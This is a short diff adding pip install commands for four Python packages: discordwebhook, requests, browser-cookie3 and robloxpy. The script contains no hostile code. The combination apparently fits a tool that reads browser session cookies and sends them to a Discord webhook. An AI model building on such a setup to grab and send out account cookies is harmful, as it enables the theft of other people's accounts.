@@ -1,0 +1,4 @@
+py -m pip install discordwebhook
+py -m pip install requests
+py -m pip install browser-cookie3
+py -m pip install robloxpy
